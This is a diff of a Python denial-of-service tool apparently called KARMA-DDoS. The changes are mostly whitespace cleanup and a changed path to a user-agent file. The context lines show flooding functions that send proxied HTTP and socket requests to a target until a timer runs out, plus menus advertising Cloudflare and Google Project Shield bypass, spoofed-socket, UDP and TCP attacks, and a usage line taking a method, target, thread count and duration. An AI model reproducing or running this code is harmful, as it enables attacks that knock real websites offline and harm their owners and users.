@@ -62,7 +62,7 @@ def get_cookie(url):
     arguments = [
     '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
     '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
-    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
+    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
     ]
     for argument in arguments:
         options.add_argument(argument)
@@ -167,7 +167,7 @@ def sender(host, port, until_datetime, payload):
         except:
             sock.close()
             pass
-            
+
 #endregion
 
 #region METHOD
@@ -253,7 +253,7 @@ def AttackPXRAW(url, until_datetime):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         proxy = 'http://'+str(random.choice(list(proxies)))
         proxy = {
-            'http': proxy,   
+            'http': proxy,
             'https': proxy,
         }
         try:
@@ -516,7 +516,7 @@ def AttackPXCFB(url, until_datetime, scraper):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             proxy = {
-                    'http': 'http://'+str(random.choice(list(proxies))),   
+                    'http': 'http://'+str(random.choice(list(proxies))),
                     'https': 'http://'+str(random.choice(list(proxies))),
             }
             scraper.get(url, proxies=proxy)
@@ -587,7 +587,7 @@ def LaunchCFSOC(url, th, t):
         try:
             thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
             thd.start()
-        except:  
+        except:
             pass
 
 def AttackCFSOC(until_datetime, target, req):
@@ -727,7 +727,7 @@ def AttackPXHTTP2(url, until_datetime):
             'Sec-Fetch-User': '?1',
             'TE': 'trailers',
             }
-    
+
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             client = httpx.Client(
@@ -764,7 +764,7 @@ def test1(url, th, t):
         try:
             thd = threading.Thread(target=test2,args=(until, target, req,))
             thd.start()
-        except:  
+        except:
             pass
 
 def test2(until_datetime, target, req):
@@ -788,10 +788,10 @@ def test2(until_datetime, target, req):
 
 #endregion
 
-def clear(): 
-    if name == 'nt': 
+def clear():
+    if name == 'nt':
         system('cls')
-    else: 
+    else:
         system('clear')
 ##############################################################################################
 def help():
@@ -820,7 +820,7 @@ def credit():
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mYone不\n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Methods/Tools "+Fore.RED+": \x1b[38;2;0;255;189mSkyWtkh\n")
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
-    stdout.write("\n")    
+    stdout.write("\n")
 ##############################################################################################
 def layer7():
     clear()
@@ -831,7 +831,7 @@ def layer7():
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"╔══════════╩═════════════════════════════════╩═════════╗\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                         "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy              "+Fore.LIGHTCYAN_EX+"║\n")                  
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy              "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfreq  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsky  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,   "+Fore.LIGHTCYAN_EX+"║\n")
@@ -843,14 +843,14 @@ def layer7():
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Post Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Head Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pps    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Only GET / HTTP/1.1                      "+Fore.LIGHTCYAN_EX+"║\n")
-    
+
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                 "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxspoof"+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack With Proxy      "+Fore.LIGHTCYAN_EX+"║\n")
-    
+
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"soc    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Socket Attack                            "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxraw  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                     "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsoc  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╚══════════════════════════════════════════════════════╝\n") 
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╚══════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
 def layer4():
@@ -863,7 +863,7 @@ def layer4():
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" TCP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
 def tools():
@@ -877,7 +877,7 @@ def tools():
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Geo IP Address Lookup"+Fore.LIGHTCYAN_EX+"                     ║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup   "+Fore.LIGHTCYAN_EX+"                     ║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet"+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup   "+Fore.LIGHTCYAN_EX+"               ║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
 def title():
@@ -902,7 +902,7 @@ def command():
     elif command == "help" or command == "?":
         help()
     elif command == "credit":
-        credit()        
+        credit()
     elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
         layer7()
     elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
@@ -946,13 +946,13 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchPPS(target, thread, t)
-        timer.join() 
+        timer.join()
     elif command == "spoof" or command == "SPOOF":
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchSPOOF(target, thread, t)
-        timer.join() 
+        timer.join()
     elif command == "pxspoof" or command == "PXSPOOF":
         target, thread, t = get_info_l7()
         #timer = threading.Thread(target=countdown, args=(t,))
@@ -1043,9 +1043,9 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
-        
 
-##############################################################################################     
+
+##############################################################################################
     elif command == "subnet":
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
         target = input()
@@ -1053,8 +1053,8 @@ def command():
             r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
             print(r.text)
         except:
-            print('An error has occurred while sending the request to the API!')                   
-            
+            print('An error has occurred while sending the request to the API!')
+
     elif command == "dns":
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
         target = input()
@@ -1063,7 +1063,7 @@ def command():
             print(r.text)
         except:
             print('An error has occurred while sending the request to the API!')
-            
+
     elif command == "geoip":
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
         target = input()
@@ -1073,8 +1073,8 @@ def command():
         except:
             print('An error has occurred while sending the request to the API!')
     else:
-        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")  
-##############################################################################################   
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")
+##############################################################################################
 
 def func():
     stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
@@ -1090,7 +1090,7 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
-    
+
     #stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
     #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
     #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
@@ -1099,7 +1099,7 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")
-    
+
     stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
@@ -1108,7 +1108,7 @@ def func():
 if __name__ == '__main__':
     init(convert=True)
     if len(sys.argv) < 2:
-        ua = open('./resources/ua.txt', 'r').read().split('\n')
+        ua = open('/home/KARMA-DDoS/ua.txt', 'r').read().split('\n')
         clear()
         title()
         while True:
@@ -1119,7 +1119,7 @@ if __name__ == '__main__':
         stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
         stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
         sys.exit()
-    ua = open('./resources/ua.txt', 'r').read().split('\n')
+    ua = open('/home/KARMA-DDoS/ua.txt', 'r').read().split('\n')
     method = sys.argv[1].rstrip()
     target = sys.argv[2].rstrip()
     thread = sys.argv[3].rstrip()
